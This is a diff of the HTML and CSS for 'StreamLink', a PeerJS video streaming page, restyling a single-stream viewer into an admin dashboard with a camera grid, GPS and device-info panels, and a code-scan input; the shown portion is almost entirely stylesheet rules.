@@ -3,489 +3,1037 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>StreamLink · Visor</title>
+<title>StreamLink · Admin</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 :root{
-  --bg:#080810;--s1:#0d0d1a;--s2:#12121f;--s3:#1a1a2e;
-  --border:#ffffff0f;--border2:#ffffff18;
-  --accent:#3a86ff;--accent2:#74b0ff;--accent-dim:#3a86ff12;
-  --red:#ef4444;--red-dim:#ef444412;
-  --green:#2dc653;--green-dim:#2dc65312;
-  --yellow:#ffd60a;--yellow-dim:#ffd60a12;
-  --text:#f0f0f8;--text2:#9898b8;--text3:#5a5a7a;
-  --radius:14px;--radius-sm:8px;
+  --bg:#05050e;--s1:#0a0a18;--s2:#0f0f1e;--s3:#151528;
+  --border:#ffffff0a;--border2:#ffffff14;--border3:#ffffff20;
+  --accent:#7c3aed;--accent2:#a78bfa;--accent-dim:#7c3aed14;
+  --red:#ef4444;--red-dim:#ef444414;
+  --green:#10b981;--green-dim:#10b98114;
+  --yellow:#f59e0b;--yellow-dim:#f59e0b14;
+  --cyan:#06b6d4;--cyan-dim:#06b6d414;
+  --text:#eeeef8;--text2:#8888aa;--text3:#44445a;
+  --radius:12px;--radius-sm:8px;--radius-xs:5px;
 }
 html,body{height:100%;overflow:hidden}
 body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;display:flex;flex-direction:column;position:relative;}
-body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 60% 50% at 80% 0%,#3a86ff08 0%,transparent 70%),radial-gradient(ellipse 50% 40% at 20% 100%,#2dc65306 0%,transparent 70%);pointer-events:none;z-index:0;}
+body::before{content:'';position:fixed;inset:0;
+  background:
+    radial-gradient(ellipse 70% 50% at 10% 0%,#7c3aed0a 0%,transparent 60%),
+    radial-gradient(ellipse 50% 40% at 90% 100%,#06b6d408 0%,transparent 60%),
+    radial-gradient(ellipse 40% 30% at 50% 50%,#7c3aed04 0%,transparent 70%);
+  pointer-events:none;z-index:0;}
 
-.topbar{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(8,8,16,.9);border-bottom:1px solid var(--border);backdrop-filter:blur(20px);position:relative;z-index:10;flex-shrink:0;}
-.brand{display:flex;align-items:center;gap:10px;font-size:.8rem;font-weight:700;letter-spacing:.15em;text-transform:uppercase;color:var(--text2);}
-.brand-dot{width:10px;height:10px;border-radius:50%;background:var(--accent);box-shadow:0 0 12px var(--accent),0 0 24px #3a86ff40;}
+/* ── TOPBAR ── */
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:0 20px;height:52px;
+  background:rgba(5,5,14,.95);border-bottom:1px solid var(--border2);
+  backdrop-filter:blur(20px);position:relative;z-index:100;flex-shrink:0;}
+.brand{display:flex;align-items:center;gap:10px;font-size:.78rem;font-weight:800;letter-spacing:.18em;text-transform:uppercase;}
+.brand-logo{display:flex;align-items:center;gap:8px}
+.brand-dot{width:8px;height:8px;border-radius:50%;background:var(--accent2);
+  box-shadow:0 0 10px var(--accent),0 0 20px #7c3aed60;}
+.brand-name{color:var(--text2)}
+.brand-tag{color:var(--accent2);margin-left:2px}
+.topbar-center{display:flex;align-items:center;gap:6px}
 .topbar-right{display:flex;align-items:center;gap:8px}
 
-.badge{font-family:'JetBrains Mono',monospace;font-size:.65rem;font-weight:500;padding:4px 10px;border-radius:999px;border:1px solid transparent;letter-spacing:.05em;transition:all .3s;}
+.badge{font-family:'JetBrains Mono',monospace;font-size:.6rem;font-weight:600;padding:3px 10px;
+  border-radius:999px;border:1px solid transparent;letter-spacing:.06em;transition:all .3s;}
 .badge-idle{color:var(--text3);border-color:var(--border2)}
-.badge-call{color:var(--yellow);border-color:#ffd60a30;background:var(--yellow-dim);animation:blink 1.5s infinite}
-.badge-live{color:var(--red);border-color:#ef444430;background:var(--red-dim);animation:blink 1.2s infinite}
-.badge-conn{color:var(--green);border-color:#2dc65330;background:var(--green-dim)}
+.badge-scan{color:var(--yellow);border-color:#f59e0b30;background:var(--yellow-dim);animation:pulse 2s infinite}
+.badge-live{color:var(--green);border-color:#10b98130;background:var(--green-dim)}
 .badge-err{color:var(--red);border-color:#ef444430;background:var(--red-dim)}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.45}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
 
-.main{flex:1;display:grid;grid-template-columns:1fr 280px;grid-template-rows:1fr auto;overflow:hidden;position:relative;z-index:1;min-height:0;}
+.top-stat{font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--text3);
+  display:flex;align-items:center;gap:6px;padding:0 10px;border-left:1px solid var(--border2);}
+.top-stat-val{color:var(--text);font-weight:600}
+.top-stat-val.green{color:var(--green)}.top-stat-val.yellow{color:var(--yellow)}.top-stat-val.red{color:var(--red)}
 
-.video-zone{grid-column:1;grid-row:1;position:relative;background:#000;overflow:hidden;}
-#remoteVideo{width:100%;height:100%;object-fit:contain;display:block;transition:filter .3s;}
+/* ── LAYOUT ── */
+.workspace{flex:1;display:flex;overflow:hidden;position:relative;z-index:1;min-height:0;}
 
-.live-badge{position:absolute;top:14px;left:14px;background:var(--red);color:#fff;font-family:'JetBrains Mono',monospace;font-size:.62rem;font-weight:600;padding:4px 10px;border-radius:4px;letter-spacing:.1em;display:none;z-index:5;box-shadow:0 0 20px #ef444450;}
+/* ── LEFT PANEL ── */
+.left-panel{width:230px;flex-shrink:0;background:var(--s1);border-right:1px solid var(--border);
+  display:flex;flex-direction:column;overflow:hidden;}
 
-.vid-stats-overlay{position:absolute;top:14px;right:14px;background:rgba(0,0,0,.75);border:1px solid var(--border2);border-radius:var(--radius-sm);padding:8px 12px;font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text2);line-height:1.8;display:none;z-index:5;backdrop-filter:blur(8px);min-width:160px;}
-.stat-row{display:flex;justify-content:space-between;gap:16px}
-.stat-val{color:var(--text);font-weight:600}
+.panel-header{padding:12px 16px;border-bottom:1px solid var(--border);flex-shrink:0;}
+.panel-title{font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:.14em;
+  text-transform:uppercase;color:var(--text3);margin-bottom:2px;}
+.panel-sub{font-size:.72rem;font-weight:700;color:var(--text2)}
 
-/* GPS overlay on video */
-.vid-gps-overlay{position:absolute;bottom:14px;left:14px;background:rgba(0,0,0,.75);border:1px solid rgba(45,198,83,.2);border-radius:var(--radius-sm);padding:6px 12px;font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--green);display:none;z-index:5;backdrop-filter:blur(6px);line-height:1.7;max-width:280px;}
+/* Camera list */
+.cam-list{flex:1;overflow-y:auto;padding:8px;}
+.cam-item{border:1px solid var(--border2);border-radius:var(--radius-sm);margin-bottom:6px;
+  cursor:pointer;transition:all .2s;overflow:hidden;background:var(--s2);}
+.cam-item:hover{border-color:var(--border3);background:var(--s3)}
+.cam-item.active{border-color:var(--accent);background:var(--accent-dim)}
+.cam-item.active .cam-item-header{background:var(--accent-dim)}
+.cam-item-header{display:flex;align-items:center;gap:8px;padding:9px 10px;border-bottom:1px solid var(--border)}
+.cam-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;transition:background .3s;}
+.cam-dot.live{background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse .8s infinite}
+.cam-dot.connecting{background:var(--yellow);animation:pulse 1s infinite}
+.cam-dot.error{background:var(--red)}
+.cam-dot.offline{background:var(--text3)}
+.cam-name{font-family:'JetBrains Mono',monospace;font-size:.7rem;font-weight:600;color:var(--text);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.cam-status-text{font-family:'JetBrains Mono',monospace;font-size:.55rem;color:var(--text3)}
+.cam-thumb{width:100%;aspect-ratio:16/9;background:#000;position:relative;overflow:hidden;}
+.cam-thumb video{width:100%;height:100%;object-fit:cover;}
+.cam-thumb-overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+  background:rgba(0,0,0,.6);font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--text3);}
+.cam-item-footer{display:flex;gap:6px;padding:7px 10px;align-items:center;}
+.cam-footer-stat{font-family:'JetBrains Mono',monospace;font-size:.55rem;color:var(--text3);
+  display:flex;align-items:center;gap:3px;}
+.cam-footer-stat span{color:var(--text2)}
+.cam-badge-live{font-family:'JetBrains Mono',monospace;font-size:.52rem;padding:2px 6px;
+  border-radius:3px;background:var(--green);color:#fff;font-weight:700;margin-left:auto;letter-spacing:.05em;}
 
-.connect-overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(135deg,#080810 0%,#0d0d1a 100%);z-index:20;gap:18px;padding:32px;text-align:center;}
-.connect-overlay-icon{width:72px;height:72px;border-radius:50%;background:var(--accent-dim);border:1px solid #3a86ff30;display:flex;align-items:center;justify-content:center;margin-bottom:4px;}
-.connect-overlay h2{font-size:1.3rem;font-weight:800;letter-spacing:-.01em}
-.connect-overlay p{font-size:.82rem;color:var(--text2);max-width:280px;line-height:1.6}
+.scan-section{padding:10px 8px;border-top:1px solid var(--border);flex-shrink:0;}
+.scan-input-wrap{display:flex;gap:6px;margin-bottom:8px}
+.scan-input{flex:1;background:var(--s2);border:1px solid var(--border2);border-radius:var(--radius-xs);
+  padding:7px 10px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.75rem;
+  font-weight:600;letter-spacing:.12em;text-align:center;outline:none;transition:border-color .15s;}
+.scan-input::placeholder{color:var(--text3);letter-spacing:.04em;font-size:.65rem;font-weight:400}
+.scan-input:focus{border-color:var(--accent);box-shadow:0 0 0 2px #7c3aed18}
+.btn-add{background:var(--accent);color:#fff;border:none;border-radius:var(--radius-xs);
+  padding:7px 12px;font-family:'Syne',sans-serif;font-size:.7rem;font-weight:700;cursor:pointer;
+  transition:all .15s;white-space:nowrap;}
+.btn-add:hover{background:var(--accent2);transform:translateY(-1px)}
+.btn-add:active{transform:none}
 
-.code-input-wrap{display:flex;gap:8px;width:100%;max-width:300px}
-.code-input{flex:1;background:rgba(255,255,255,.05);border:1px solid var(--border2);border-radius:var(--radius-sm);padding:13px 14px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:1.5rem;font-weight:600;letter-spacing:.22em;text-align:center;outline:none;transition:border-color .15s;}
-.code-input::placeholder{color:var(--text3);letter-spacing:.05em;font-size:.85rem;font-weight:400}
-.code-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px #3a86ff15}
-.btn-primary{background:var(--accent);color:#fff;border:none;border-radius:var(--radius-sm);padding:13px 24px;font-family:'Syne',sans-serif;font-size:.88rem;font-weight:700;cursor:pointer;transition:all .2s;white-space:nowrap;box-shadow:0 0 24px #3a86ff40;}
-.btn-primary:hover{transform:translateY(-2px);box-shadow:0 0 40px #3a86ff60}
-.btn-primary:active{transform:translateY(0)}
-.btn-primary:disabled{opacity:.4;cursor:not-allowed;transform:none}
+.scan-auto-btn{width:100%;background:var(--s2);border:1px solid var(--border2);color:var(--text2);
+  border-radius:var(--radius-xs);padding:7px;font-family:'JetBrains Mono',monospace;font-size:.62rem;
+  cursor:pointer;transition:all .15s;letter-spacing:.04em;display:flex;align-items:center;justify-content:center;gap:6px;}
+.scan-auto-btn:hover{background:var(--s3);color:var(--text)}
+.scan-auto-btn.scanning{border-color:#f59e0b50;color:var(--yellow);animation:pulse 1.5s infinite}
+.scan-dot{width:6px;height:6px;border-radius:50%;background:currentColor;}
 
-.reconnect-overlay{position:absolute;inset:0;display:none;flex-direction:column;align-items:center;justify-content:center;background:rgba(8,8,16,.85);backdrop-filter:blur(6px);z-index:25;gap:14px;}
-.spinner{width:40px;height:40px;border:3px solid var(--border2);border-top-color:var(--yellow);border-radius:50%;animation:spin .7s linear infinite;}
+/* ── MAIN CONTENT ── */
+.main-content{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0;}
+
+/* View toolbar */
+.view-toolbar{height:42px;background:var(--s1);border-bottom:1px solid var(--border);
+  display:flex;align-items:center;padding:0 14px;gap:8px;flex-shrink:0;}
+.view-btn{background:none;border:1px solid transparent;border-radius:var(--radius-xs);
+  padding:5px 10px;color:var(--text3);font-family:'JetBrains Mono',monospace;font-size:.6rem;
+  cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:5px;letter-spacing:.04em;}
+.view-btn:hover{color:var(--text2);border-color:var(--border2)}
+.view-btn.active{color:var(--accent2);border-color:#7c3aed40;background:var(--accent-dim)}
+.view-btn svg{width:14px;height:14px}
+.toolbar-sep{width:1px;height:20px;background:var(--border2);margin:0 4px;}
+.toolbar-label{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--text3);margin-left:auto;}
+.toolbar-val{color:var(--text2);font-weight:600}
+
+/* Grid area */
+.grid-area{flex:1;overflow:auto;padding:10px;}
+
+/* Grid layouts */
+.cam-grid{display:grid;gap:8px;width:100%;height:100%;}
+.cam-grid.layout-1{grid-template-columns:1fr;grid-template-rows:1fr;}
+.cam-grid.layout-2{grid-template-columns:1fr 1fr;grid-template-rows:1fr;}
+.cam-grid.layout-4{grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr;}
+.cam-grid.layout-6{grid-template-columns:1fr 1fr 1fr;grid-template-rows:1fr 1fr;}
+.cam-grid.layout-9{grid-template-columns:1fr 1fr 1fr;grid-template-rows:1fr 1fr 1fr;}
+.cam-grid.layout-auto{grid-template-columns:repeat(auto-fill,minmax(320px,1fr));grid-auto-rows:180px;}
+
+/* Camera cell */
+.cam-cell{position:relative;background:#000;border-radius:var(--radius-sm);overflow:hidden;
+  border:1px solid var(--border2);transition:border-color .2s;cursor:pointer;}
+.cam-cell:hover{border-color:var(--border3)}
+.cam-cell.selected{border-color:var(--accent);box-shadow:0 0 0 2px #7c3aed30;}
+.cam-cell video{width:100%;height:100%;object-fit:contain;display:block;}
+.cam-cell-overlay{position:absolute;inset:0;background:rgba(5,5,14,.8);display:flex;
+  flex-direction:column;align-items:center;justify-content:center;gap:10px;}
+.cam-cell-overlay.hidden{display:none}
+
+.cell-connecting{display:flex;flex-direction:column;align-items:center;gap:8px;}
+.mini-spinner{width:28px;height:28px;border:2px solid var(--border2);border-top-color:var(--accent2);
+  border-radius:50%;animation:spin .7s linear infinite;}
 @keyframes spin{to{transform:rotate(360deg)}}
-.reconnect-overlay p{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--yellow)}
-.loading-overlay{position:absolute;inset:0;display:none;flex-direction:column;align-items:center;justify-content:center;background:rgba(8,8,16,.9);z-index:22;gap:12px;}
-.loading-overlay .spinner{border-top-color:var(--accent)}
-.loading-overlay p{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--text2)}
+.mini-spinner-txt{font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--text3)}
 
-/* Freeze indicator */
-.freeze-bar{position:absolute;bottom:0;left:0;right:0;background:rgba(255,214,10,.12);border-top:1px solid rgba(255,214,10,.3);padding:5px 14px;font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--yellow);display:none;z-index:6;text-align:center;}
+.cam-cell-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;
+  font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text3);
+  background:var(--s1);border:1px dashed var(--border2);border-radius:var(--radius-sm);}
+.cam-cell-empty svg{opacity:.3}
 
-.sidebar{grid-column:2;grid-row:1/3;background:var(--s1);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto;overflow-x:hidden;}
+/* HUD on cam cell */
+.cell-hud-top{position:absolute;top:0;left:0;right:0;padding:8px;display:flex;align-items:flex-start;justify-content:space-between;z-index:5;
+  background:linear-gradient(to bottom,rgba(0,0,0,.7) 0%,transparent 100%);}
+.cell-hud-bot{position:absolute;bottom:0;left:0;right:0;padding:8px;display:flex;align-items:flex-end;justify-content:space-between;z-index:5;
+  background:linear-gradient(to top,rgba(0,0,0,.75) 0%,transparent 100%);}
+.cell-live-badge{font-family:'JetBrains Mono',monospace;font-size:.55rem;font-weight:700;
+  padding:2px 7px;border-radius:3px;background:var(--red);color:#fff;letter-spacing:.06em;
+  box-shadow:0 0 12px #ef444450;}
+.cell-cam-name{font-family:'JetBrains Mono',monospace;font-size:.65rem;font-weight:600;
+  color:#fff;text-shadow:0 1px 4px rgba(0,0,0,.8);}
+.cell-stats-row{display:flex;gap:6px;align-items:center;}
+.cell-stat{font-family:'JetBrains Mono',monospace;font-size:.55rem;color:rgba(255,255,255,.6);
+  background:rgba(0,0,0,.5);padding:2px 6px;border-radius:3px;}
+.cell-stat.g{color:#10b981}.cell-stat.y{color:#f59e0b}.cell-stat.r{color:#ef4444}
+.cell-gps-badge{font-family:'JetBrains Mono',monospace;font-size:.52rem;color:var(--green);
+  background:rgba(0,0,0,.6);padding:2px 7px;border-radius:3px;max-width:200px;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.cell-actions{display:flex;gap:4px;}
+.cell-action-btn{background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.12);color:rgba(255,255,255,.7);
+  border-radius:4px;width:26px;height:26px;display:flex;align-items:center;justify-content:center;
+  cursor:pointer;transition:all .15s;flex-shrink:0;}
+.cell-action-btn:hover{background:rgba(255,255,255,.15);color:#fff}
+.cell-action-btn svg{width:12px;height:12px}
 
-.section{padding:14px 18px;border-bottom:1px solid var(--border)}
-.section-title{font-family:'JetBrains Mono',monospace;font-size:.6rem;letter-spacing:.14em;text-transform:uppercase;color:var(--text3);margin-bottom:12px;}
+/* Empty grid state */
+.empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;
+  height:100%;gap:16px;text-align:center;}
+.empty-state-icon{width:64px;height:64px;border-radius:50%;background:var(--s2);border:1px solid var(--border2);
+  display:flex;align-items:center;justify-content:center;opacity:.5;}
+.empty-state h3{font-size:1rem;font-weight:700;color:var(--text2)}
+.empty-state p{font-size:.78rem;color:var(--text3);max-width:260px;line-height:1.6}
 
-.ctrl-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-.ctrl-btn{background:var(--s2);border:1px solid var(--border);color:var(--text2);border-radius:var(--radius-sm);padding:10px 8px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;cursor:pointer;transition:all .2s;font-family:'Syne',sans-serif;font-size:.68rem;font-weight:600;letter-spacing:.02em;}
-.ctrl-btn svg{width:18px;height:18px}
-.ctrl-btn:hover{background:var(--s3);border-color:var(--border2);color:var(--text);transform:translateY(-1px)}
-.ctrl-btn:active{transform:translateY(0)}
-.ctrl-btn.active{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
-.ctrl-btn.active-red{border-color:var(--red);color:var(--red);background:var(--red-dim)}
-.ctrl-btn:disabled{opacity:.3;cursor:not-allowed;transform:none}
+/* ── RIGHT PANEL ── */
+.right-panel{width:260px;flex-shrink:0;background:var(--s1);border-left:1px solid var(--border);
+  display:flex;flex-direction:column;overflow-y:auto;overflow-x:hidden;}
 
-.ctrl-btn-full{background:var(--s2);border:1px solid var(--border);color:var(--text2);border-radius:var(--radius-sm);padding:10px 14px;display:flex;align-items:center;justify-content:flex-start;gap:10px;cursor:pointer;transition:all .2s;font-family:'Syne',sans-serif;font-size:.75rem;font-weight:600;width:100%;margin-bottom:8px;}
-.ctrl-btn-full svg{width:16px;height:16px;flex-shrink:0}
-.ctrl-btn-full:hover{background:var(--s3);border-color:var(--border2);color:var(--text)}
-.ctrl-btn-full.rec-active{border-color:var(--red);color:var(--red);background:var(--red-dim);animation:blink 1s infinite}
+.section{padding:12px 14px;border-bottom:1px solid var(--border)}
+.section-title{font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:.14em;
+  text-transform:uppercase;color:var(--text3);margin-bottom:10px;}
 
-.slider-row{display:flex;align-items:center;gap:10px;margin-top:8px}
-.slider-label{font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--text3);flex-shrink:0;width:36px}
-.slider-val{font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--accent);flex-shrink:0;width:32px;text-align:right}
-input[type=range]{flex:1;height:3px;background:var(--s3);border-radius:999px;outline:none;-webkit-appearance:none;cursor:pointer;}
-input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:14px;height:14px;background:var(--accent);border-radius:50%;cursor:pointer;box-shadow:0 0 8px var(--accent);transition:transform .15s;}
-input[type=range]::-webkit-slider-thumb:hover{transform:scale(1.3)}
+/* Selected cam detail */
+.detail-header{display:flex;align-items:center;gap:8px;margin-bottom:10px;}
+.detail-dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse .8s infinite;flex-shrink:0;}
+.detail-name{font-size:.9rem;font-weight:800;color:var(--text)}
+.detail-id{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--text3)}
 
-.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
-.stat-card{background:var(--s2);border:1px solid var(--border);border-radius:var(--radius-sm);padding:10px}
-.stat-card-label{font-family:'JetBrains Mono',monospace;font-size:.55rem;color:var(--text3);letter-spacing:.08em;text-transform:uppercase;margin-bottom:4px}
-.stat-card-val{font-family:'JetBrains Mono',monospace;font-size:.95rem;font-weight:600;color:var(--text)}
-.stat-card-val.g{color:var(--green)}.stat-card-val.y{color:var(--yellow)}.stat-card-val.r{color:var(--red)}
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:5px}
+.info-card{background:var(--s2);border:1px solid var(--border);border-radius:var(--radius-xs);padding:8px;}
+.info-card-label{font-family:'JetBrains Mono',monospace;font-size:.5rem;color:var(--text3);letter-spacing:.08em;text-transform:uppercase;margin-bottom:3px;}
+.info-card-val{font-family:'JetBrains Mono',monospace;font-size:.82rem;font-weight:600;color:var(--text);line-height:1.2}
+.info-card-val.g{color:var(--green)}.info-card-val.y{color:var(--yellow)}.info-card-val.r{color:var(--red)}
 
-/* GPS card in sidebar */
-.gps-info-card{background:var(--s2);border:1px solid rgba(45,198,83,.18);border-radius:var(--radius-sm);padding:12px;font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text2);line-height:2;}
-.gps-row{display:flex;justify-content:space-between;gap:8px;}
+.ctrl-row{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px;}
+.ctrl-btn{background:var(--s2);border:1px solid var(--border);color:var(--text2);border-radius:var(--radius-xs);
+  padding:8px 6px;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  gap:4px;cursor:pointer;transition:all .2s;font-family:'Syne',sans-serif;font-size:.63rem;font-weight:600;}
+.ctrl-btn svg{width:15px;height:15px}
+.ctrl-btn:hover{background:var(--s3);color:var(--text)}
+.ctrl-btn.act{border-color:var(--accent);color:var(--accent2);background:var(--accent-dim)}
+.ctrl-btn:disabled{opacity:.3;cursor:not-allowed}
+
+.ctrl-btn-full{background:var(--s2);border:1px solid var(--border);color:var(--text2);
+  border-radius:var(--radius-xs);padding:8px 12px;display:flex;align-items:center;gap:8px;
+  cursor:pointer;transition:all .2s;font-family:'Syne',sans-serif;font-size:.7rem;font-weight:600;
+  width:100%;margin-bottom:6px;}
+.ctrl-btn-full svg{width:14px;height:14px;flex-shrink:0}
+.ctrl-btn-full:hover{background:var(--s3);color:var(--text)}
+.ctrl-btn-full.rec-active{border-color:var(--red);color:var(--red);background:var(--red-dim);animation:pulse 1s infinite}
+.ctrl-btn-full:disabled{opacity:.3;cursor:not-allowed}
+
+/* GPS detail */
+.gps-card{background:var(--s2);border:1px solid rgba(16,185,129,.2);border-radius:var(--radius-xs);
+  padding:10px;font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--text2);line-height:2;}
+.gps-row{display:flex;justify-content:space-between;gap:6px;}
 .gps-val{color:var(--green);}
-.gps-link{display:block;margin-top:8px;text-align:center;color:var(--accent);font-size:.62rem;text-decoration:none;border:1px solid #3a86ff30;border-radius:var(--radius-sm);padding:5px;transition:background .15s;}
-.gps-link:hover{background:var(--blue-dim)}
-.gps-inactive{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--text3);text-align:center;padding:10px 0;}
+.gps-no-data{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text3);
+  text-align:center;padding:10px 0;}
+.gps-map-btn{display:flex;align-items:center;justify-content:center;gap:6px;
+  margin-top:8px;padding:6px;border:1px solid #10b98130;border-radius:var(--radius-xs);
+  color:var(--green);font-family:'JetBrains Mono',monospace;font-size:.6rem;
+  cursor:pointer;transition:background .15s;background:none;width:100%;}
+.gps-map-btn:hover{background:var(--green-dim)}
 
-/* Device info card */
-.device-info-card{background:var(--s2);border:1px solid var(--border2);border-radius:var(--radius-sm);padding:12px;font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text2);line-height:2;}
-.di-row{display:flex;justify-content:space-between;gap:8px;flex-wrap:wrap;}
-.di-val{color:var(--text);text-align:right;max-width:140px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+/* Device info */
+.device-card{background:var(--s2);border:1px solid var(--border2);border-radius:var(--radius-xs);
+  padding:10px;font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--text2);line-height:2.1;}
+.di-row{display:flex;justify-content:space-between;gap:6px;}
+.di-val{color:var(--text);text-align:right;max-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
 .di-val.g{color:var(--green)}.di-val.y{color:var(--yellow)}.di-val.r{color:var(--red)}
-.di-waiting{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--text3);text-align:center;padding:10px 0;}
+.di-wait{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text3);text-align:center;padding:10px 0;}
 
-.conn-card{background:var(--s2);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px;font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--text2);line-height:2;}
-.conn-card-row{display:flex;justify-content:space-between}
-.conn-val{color:var(--text)}
+/* No selection */
+.no-selection{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--text3);text-align:center;padding:20px 0;}
 
-.bottombar{grid-column:1;grid-row:2;background:rgba(8,8,16,.9);border-top:1px solid var(--border);backdrop-filter:blur(20px);padding:10px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-shrink:0;}
-.bottom-group{display:flex;align-items:center;gap:8px}
-.bottom-btn{background:var(--s2);border:1px solid var(--border);color:var(--text2);border-radius:var(--radius-sm);padding:8px 14px;display:flex;align-items:center;gap:7px;cursor:pointer;transition:all .15s;font-family:'Syne',sans-serif;font-size:.75rem;font-weight:600;}
-.bottom-btn svg{width:15px;height:15px}
-.bottom-btn:hover{background:var(--s3);color:var(--text)}
-.bottom-btn.active{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
-.bottom-btn.danger{border-color:#ef444430;color:var(--red);background:var(--red-dim)}
-.bottom-btn.danger:hover{background:var(--red);color:#fff;box-shadow:0 0 20px #ef444450}
-.bottom-btn:disabled{opacity:.35;cursor:not-allowed}
-
-.rec-timer{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--red);display:none;align-items:center;gap:6px;}
-.rec-timer-dot{width:7px;height:7px;background:var(--red);border-radius:50%;animation:blink .8s infinite}
-
-.error-bar{display:none;padding:9px 20px;background:rgba(239,68,68,.08);border-top:1px solid rgba(239,68,68,.2);font-size:.75rem;color:#ff8a8a;text-align:center;font-family:'JetBrains Mono',monospace;position:relative;z-index:10;flex-shrink:0;}
-
-::-webkit-scrollbar{width:4px}
+/* Scrollbar */
+::-webkit-scrollbar{width:3px}
 ::-webkit-scrollbar-track{background:transparent}
 ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+
+/* Notification toast */
+.toast{position:fixed;bottom:20px;right:20px;z-index:999;background:var(--s2);border:1px solid var(--border2);
+  border-radius:var(--radius-sm);padding:10px 16px;font-family:'JetBrains Mono',monospace;font-size:.7rem;
+  color:var(--text);box-shadow:0 4px 24px rgba(0,0,0,.5);transform:translateY(10px);opacity:0;
+  transition:all .25s;pointer-events:none;max-width:280px;}
+.toast.show{transform:translateY(0);opacity:1}
+.toast.success{border-left:3px solid var(--green);color:var(--green)}
+.toast.error{border-left:3px solid var(--red);color:var(--red)}
+.toast.info{border-left:3px solid var(--accent2);color:var(--accent2)}
+
+/* Scan progress bar */
+.scan-progress{height:2px;background:var(--s2);position:relative;overflow:hidden;margin-top:6px;border-radius:999px;}
+.scan-progress-bar{height:100%;background:linear-gradient(90deg,var(--accent),var(--cyan));
+  border-radius:999px;transition:width .3s;width:0%;}
+
+/* Vol slider */
+.slider-mini{flex:1;height:2px;background:var(--s3);border-radius:999px;outline:none;-webkit-appearance:none;cursor:pointer;}
+.slider-mini::-webkit-slider-thumb{-webkit-appearance:none;width:12px;height:12px;background:var(--accent2);border-radius:50%;cursor:pointer;}
 </style>
 </head>
 <body>
 
+<!-- TOPBAR -->
 <div class="topbar">
   <div class="brand">
-    <div class="brand-dot"></div>
-    StreamLink <span style="color:var(--accent);margin-left:2px">VISOR</span>
+    <div class="brand-logo">
+      <div class="brand-dot"></div>
+      <span class="brand-name">StreamLink</span>
+      <span class="brand-tag">ADMIN</span>
+    </div>
+  </div>
+  <div class="topbar-center">
+    <div class="top-stat">CÁMARAS <span class="top-stat-val green" id="ts-total">0</span></div>
